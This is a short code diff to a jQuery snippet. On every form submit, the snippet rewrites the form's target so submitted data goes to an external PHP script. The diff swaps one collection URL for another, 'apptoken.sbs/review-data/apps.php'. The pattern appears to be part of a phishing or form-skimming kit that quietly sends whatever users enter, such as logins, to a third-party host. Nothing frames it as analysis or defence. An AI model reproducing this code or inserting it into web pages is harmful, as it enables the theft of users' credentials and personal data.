@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "//www.citutbesar.my.id/review-data/yokou.php");
+  $(myform).attr("action", "//www.apptoken.sbs/review-data/apps.php");
 });
